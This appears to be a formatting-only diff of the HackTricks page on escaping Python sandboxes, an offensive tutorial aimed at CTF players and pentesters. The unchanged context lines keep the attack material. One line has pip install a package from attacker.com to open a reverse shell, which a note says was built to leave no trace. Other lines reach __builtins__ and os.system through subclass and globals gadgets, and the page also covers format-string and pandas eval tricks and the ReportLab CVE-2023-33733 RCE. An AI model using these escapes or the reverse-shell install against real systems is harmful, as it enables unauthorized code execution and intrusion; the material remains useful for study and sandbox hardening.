@@ -1,9 +1,8 @@
 # Bypass Python sandboxes
 
-{{#include ../../../banners/hacktricks-training.md}}
+\{{#include ../../../banners/hacktricks-training.md\}}
 
 These are some tricks to bypass python sandbox protections and execute arbitrary commands.
-
 
 ## Command Execution Libraries
 
@@ -44,11 +43,11 @@ system('ls')
 
 Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.
 
-> [!CAUTION] > **Python2 input()** function allows executing python code before the program crashes.
+> \[!CAUTION] > **Python2 input()** function allows executing python code before the program crashes.
 
 Python try to **load libraries from the current directory first** (the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`
 
-![](<../../../images/image (559).png>)
+![](<../../../../.gitbook/assets/image (559).png>)
 
 ## Bypass pickle sandbox with the default installed python packages
 
@@ -86,17 +85,13 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 
 You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
 
-{{#file}}
-Reverse.tar (1).gz
-{{#endfile}}
+\{{#file\}} Reverse.tar (1).gz \{{#endfile\}}
 
-> [!TIP]
-> This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
+> \[!TIP] This package is called `Reverse`. However, it was specially crafted so that when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
 
 ## Eval-ing python code
 
-> [!WARNING]
-> Note that exec allows multiline strings and ";", but eval doesn't (check walrus operator)
+> \[!WARNING] Note that exec allows multiline strings and ";", but eval doesn't (check walrus operator)
 
 If certain characters are forbidden you can use the **hex/octal/B64** representation to **bypass** the restriction:
 
@@ -139,11 +134,9 @@ df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']
 
 Also see a real-world sandboxed evaluator escape in PDF generators:
 
-- ReportLab/xhtml2pdf triple-bracket [[[...]]] expression evaluation → RCE (CVE-2023-33733). It abuses rl_safe_eval to reach function.__globals__ and os.system from evaluated attributes (for example, font color) and returns a valid value to keep rendering stable.
+* ReportLab/xhtml2pdf triple-bracket \[\[\[...]]] expression evaluation → RCE (CVE-2023-33733). It abuses rl\_safe\_eval to reach function.**globals** and os.system from evaluated attributes (for example, font color) and returns a valid value to keep rendering stable.
 
-{{#ref}}
-reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
-{{#endref}}
+\{{#ref\}} reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md \{{#endref\}}
 
 ## Operators and short tricks
 
@@ -339,8 +332,8 @@ with (a as b):
 
 ## Builtins
 
-- [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
-- [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
+* [**Builtins functions of python2**](https://docs.python.org/2/library/functions.html)
+* [**Builtins functions of python3**](https://docs.python.org/3/library/functions.html)
 
 If you can access the **`__builtins__`** object you can import libraries (notice that you could also use here other string representation shown in the last section):
 
@@ -400,7 +393,7 @@ get_flag.__globals__['__builtins__']
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
 
-[**Below there is a bigger function**](#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **builtins**.
+[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **builtins**.
 
 #### Python2 and Python3
 
@@ -448,7 +441,7 @@ class_obj.__init__.__globals__
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
 
-[**Below there is a bigger function**](#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **globals**.
+[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **globals**.
 
 ## Discover Arbitrary Execution
 
@@ -596,8 +589,7 @@ __builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, Fil
 
 ## Recursive Search of Builtins, Globals...
 
-> [!WARNING]
-> This is just **awesome**. If you are **looking for an object like globals, builtins, open or anything** just use this script to **recursively find places where you can find that object.**
+> \[!WARNING] This is just **awesome**. If you are **looking for an object like globals, builtins, open or anything** just use this script to **recursively find places where you can find that object.**
 
 ```python
 import os, sys # Import these to find more gadgets
@@ -717,10 +709,7 @@ if __name__ == "__main__":
 
 You can check the output of this script on this page:
 
-
-{{#ref}}
-https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
-{{#endref}}
+\{{#ref\}} https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md \{{#endref\}}
 
 ## Python Format String
 
@@ -772,13 +761,9 @@ class HAL9000(object):
 
 **More examples** about **format** **string** examples can be found in [**https://pyformat.info/**](https://pyformat.info)
 
-> [!CAUTION]
-> Check also the following page for gadgets that will r**ead sensitive information from Python internal objects**:
+> \[!CAUTION] Check also the following page for gadgets that will r**ead sensitive information from Python internal objects**:
 
-
-{{#ref}}
-../python-internal-read-gadgets.md
-{{#endref}}
+\{{#ref\}} ../python-internal-read-gadgets.md \{{#endref\}}
 
 ### Sensitive Information Disclosure Payloads
 
@@ -808,12 +793,12 @@ According to the [**TypeMonkey chall from this writeup**](https://corgi.rip/post
 
 As reminder, every time an action is performed in python some function is executed. For example `2*3` will execute **`(2).mul(3)`** or **`{'a':'b'}['a']`** will be **`{'a':'b'}.__getitem__('a')`**.
 
-You have more like this in the section [**Python execution without calls**](#python-execution-without-calls).
+You have more like this in the section [**Python execution without calls**](./#python-execution-without-calls).
 
 A python format string vuln doesn't allow to execute function (it's doesn't allow to use parenthesis), so it's not possible to get RCE like `'{0.system("/bin/sh")}'.format(os)`.\
 However, it's possible to use `[]`. Therefore, if a common python library has a **`__getitem__`** or **`__getattr__`** method that executes arbitrary code, it's possible to abuse them to get RCE.
 
-Looking for a gadget like that in python, the writeup purposes this [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Where he found this [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
+Looking for a gadget like that in python, the writeup purposes this [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F\&type=code). Where he found this [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
 
 ```python
 class LibraryLoader(object):
@@ -847,8 +832,7 @@ The challenge actually abuses another vulnerability in the server that allows to
 
 ## Dissecting Python Objects
 
-> [!TIP]
-> If you want to **learn** about **python bytecode** in depth read this **awesome** post about the topic: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
+> \[!TIP] If you want to **learn** about **python bytecode** in depth read this **awesome** post about the topic: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
 In some CTFs you could be provided with the name of a **custom function where the flag** resides and you need to see the **internals** of the **function** to extract it.
 
@@ -887,7 +871,7 @@ get_flag.__globals__
 CustomClassObject.__class__.__init__.__globals__
 ```
 
-[**See here more places to obtain globals**](#globals-and-locals)
+[**See here more places to obtain globals**](./#globals-and-locals)
 
 ### **Accessing the function code**
 
@@ -1050,8 +1034,7 @@ mydict['__builtins__'] = __builtins__
 function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 
-> [!TIP]
-> Depending on the python version the **parameters** of `code_type` may have a **different order**. The best way to know the order of the params in the python version you are running is to run:
+> \[!TIP] Depending on the python version the **parameters** of `code_type` may have a **different order**. The best way to know the order of the params in the python version you are running is to run:
 >
 > ```
 > import types
@@ -1061,8 +1044,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 
 ### Recreating a leaked function
 
-> [!WARNING]
-> In the following example, we are going to take all the data needed to recreate the function from the function code object directly. In a **real example**, all the **values** to execute the function **`code_type`** is what **you will need to leak**.
+> \[!WARNING] In the following example, we are going to take all the data needed to recreate the function from the function code object directly. In a **real example**, all the **values** to execute the function **`code_type`** is what **you will need to leak**.
 
 ```python
 fc = get_flag.__code__
@@ -1125,10 +1107,7 @@ Using tools like [**https://www.decompiler.com/**](https://www.decompiler.com) o
 
 **Check out this tutorial**:
 
-
-{{#ref}}
-../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md
-{{#endref}}
+\{{#ref\}} ../../basic-forensic-methodology/specific-software-file-type-tricks/.pyc.md \{{#endref\}}
 
 ## Misc Python
 
@@ -1150,14 +1129,14 @@ will be bypassed
 
 ## References
 
-- [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
-- [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
-- [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
-- [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
-- [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
-- [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
-- [CVE-2023-33733 (ReportLab rl_safe_eval expression evaluation RCE) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
-- [c53elyas/CVE-2023-33733 PoC and write-up](https://github.com/c53elyas/CVE-2023-33733)
-- [0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
+* [https://lbarman.ch/blog/pyjail/](https://lbarman.ch/blog/pyjail/)
+* [https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/)
+* [https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/](https://blog.delroth.net/2013/03/escaping-a-python-sandbox-ndh-2013-quals-writeup/)
+* [https://gynvael.coldwind.pl/n/python\_sandbox\_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
+* [https://nedbatchelder.com/blog/201206/eval\_really\_is\_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
+* [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
+* [CVE-2023-33733 (ReportLab rl\_safe\_eval expression evaluation RCE) – NVD](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
+* [c53elyas/CVE-2023-33733 PoC and write-up](https://github.com/c53elyas/CVE-2023-33733)
+* [0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
 
-{{#include ../../../banners/hacktricks-training.md}}
+\{{#include ../../../banners/hacktricks-training.md\}}
